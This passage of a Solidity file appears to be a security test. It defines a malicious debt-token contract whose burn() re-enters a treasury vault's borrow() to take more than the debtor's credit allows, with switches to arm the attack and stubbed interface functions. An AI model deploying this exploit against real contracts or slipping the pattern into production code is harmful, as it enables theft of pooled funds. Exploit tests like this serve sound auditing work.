    treasuryReservesVault.borrow(targetToken, 50e18, recipient);
  }

  // Function that initiates the attack
  function startAttack(uint256 initialAmount) external {
    treasuryReservesVault.borrow(targetToken, initialAmount, recipient);
  }
}

/**
 * @title Simplified Malicious Debt Token for Burn Test
 * @notice Simplified version that specifically focuses on exploiting burnDToken
 */
contract BurnExploitToken is ITempleDebtToken {
  // Basic balance tracking
  mapping(address => uint256) internal _balances;
  uint256 internal _totalSupply;

  // Attacker and target vault
  address public attacker;
  ITreasuryReservesVault public vault;
  IERC20 public token;
  address public recipient;

  // Flag to control the attack
  bool public attackActive;

  // Track if we've performed the attack already
  bool public attackPerformed;

  // Attack parameters
  uint256 public attackAmount = 150e18; // More than we have credit for

  constructor(
    address _attacker,
    address _vault,
    address _token,
    address _recipient
  ) {
    attacker = _attacker;
    vault = ITreasuryReservesVault(_vault);
    token = IERC20(_token);
    recipient = _recipient;

    // Initialize with some tokens for the attacker
    _balances[_attacker] = 10e18; // Small balance to create _remaining > 0
    _totalSupply = 10e18;
    emit Transfer(address(0), _attacker, 10e18);
  }

  // Add missing mint function implementation required by the interface
  function mint(address _debtor, uint256 _mintAmount) external override {
    _balances[_debtor] += _mintAmount;
    _totalSupply += _mintAmount;
    emit Transfer(address(0), _debtor, _mintAmount);
  }

  // This is the burn implementation specially crafted to exploit the vulnerability
  function burn(
    address _debtor,
    uint256 _burnAmount
  ) external override returns (uint256) {
    // Get the actual balance of the debtor - this is critical!
    // We need _burnAmount > actualBalance to trigger _remaining > 0 in TRV
    uint256 actualBalance = _balances[_debtor];

    // Execute the reentrancy attack if active AND we haven't done it already
    // Only attack when burnAmount > actualBalance (forces _remaining > 0 in TRV)
    if (
      actualBalance < _burnAmount &&
      attackActive &&
      _debtor == attacker &&
      !attackPerformed
    ) {
      // Mark attack as performed to prevent infinite recursion
      attackPerformed = true;

      // Try to borrow a large amount during reentrancy
      // This should be possible because credits haven't been updated yet
      try vault.borrow(token, attackAmount, recipient) {
        // Vulnerability has been exploited successfully
      } catch Error(string memory) {
        // Error in reentrancy attack
      } catch {
        // Unknown error in reentrancy attack
      }
    }

    // Burn the smaller of the two: balance or requested amount
    uint256 actualBurnAmount = actualBalance < _burnAmount
      ? actualBalance
      : _burnAmount;
    if (actualBurnAmount > 0) {
      _balances[_debtor] -= actualBurnAmount;
      _totalSupply -= actualBurnAmount;
    }

    emit Transfer(_debtor, address(0), actualBurnAmount);
    return actualBurnAmount; // Return actual amount burned, which is less than requested if balance < burnAmount
  }

  // Function to activate/deactivate the attack
  function setAttack(bool _active) external {
    attackActive = _active;
    attackPerformed = false; // Reset for new attacks
  }

  // Set the amount to try to borrow during reentrancy
  function setAttackAmount(uint256 _amount) external {
    attackAmount = _amount;
  }

  // Implementaciones rápidas del resto de funciones
  function burnAll(address _debtor) external override returns (uint256) {
    uint256 amount = _balances[_debtor];
    if (amount > 0) {
      _balances[_debtor] = 0;
      _totalSupply -= amount;
    }
    return amount;
  }

  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }
  function transfer(address, uint256) external pure override returns (bool) {
    revert NonTransferrable();
  }
  function allowance(
    address,
    address
  ) external pure override returns (uint256) {
    return 0;
  }
  function approve(address, uint256) external pure override returns (bool) {
    revert NonTransferrable();
  }
  function transferFrom(
    address,
    address,
    uint256
  ) external pure override returns (bool) {
    revert NonTransferrable();
  }

  // Basic ITempleDebtToken implementations
  function name() external pure override returns (string memory) {
    return 'Burn Exploit Token';
  }
  function symbol() external pure override returns (string memory) {
    return 'BEXP';
  }
  function decimals() external pure override returns (uint8) {
    return 18;
  }
  function version() external pure override returns (string memory) {
    return '1.0.0';
  }

  // Remaining minimal implementations
  function baseRate() external pure override returns (uint96) {
    return 0;
  }
  function baseCheckpointTime() external pure override returns (uint32) {
    return 0;
  }
  function baseCheckpoint() external pure override returns (uint128) {
    return 0;
  }
  function baseShares() external pure override returns (uint128) {
    return 0;
  }
  function totalPrincipal() external pure override returns (uint128) {
    return 0;
  }
  function estimatedTotalRiskPremiumInterest()
    external
    pure
    override
    returns (uint128)
  {
    return 0;
  }
  function debtors(
    address
  ) external pure override returns (uint128, uint128, uint96, uint128, uint32) {
    return (0, 0, 0, 0, 0);
  }
  function minters(address) external pure override returns (bool) {
    return true;
  }
  function addMinter(address) external override {}
  function removeMinter(address) external override {}
  function setBaseInterestRate(uint96) external override {}
  function setRiskPremiumInterestRate(address, uint96) external override {}
  function checkpointBaseInterest() external override returns (uint256) {
    return 0;
  }
  function checkpointDebtorInterest(
    address
  ) external override returns (uint256) {
    return 0;
  }
  function checkpointDebtorsInterest(address[] calldata) external override {}
  function currentDebtOf(
    address
  ) external pure override returns (DebtOwed memory) {
    return DebtOwed(0, 0, 0);
  }
  function currentDebtsOf(
    address[] calldata
  ) external pure override returns (DebtOwed[] memory) {
    return new DebtOwed[](0);
  }
  function currentTotalDebt() external pure override returns (DebtOwed memory) {
    return DebtOwed(0, 0, 0);
  }
  function baseDebtToShares(uint128) external pure override returns (uint128) {
    return 0;
  }
  function baseSharesToDebt(uint128) external pure override returns (uint128) {
    return 0;
  }

  // ITempleElevatedAccess stubs
  function isElevatedAccess(address, bytes4) external pure returns (bool) {
    return true;
  }
  function rescuer() external pure returns (address) {
    return address(0);
  }
  function executor() external pure returns (address) {
    return address(0);
  }
  function explicitFunctionAccess(
    address,
    bytes4
  ) external pure returns (bool) {
    return true;
  }
  function inRescueMode() external pure returns (bool) {
    return false;
  }
  function setRescueMode(bool) external {}
  function proposeNewRescuer(address) external {}
  function acceptRescuer() external {}
  function proposeNewExecutor(address) external {}
  function acceptExecutor() external {}
  function setExplicitAccess(
    address,
    ITempleElevatedAccess.ExplicitAccess[] calldata
  ) external override {}
}
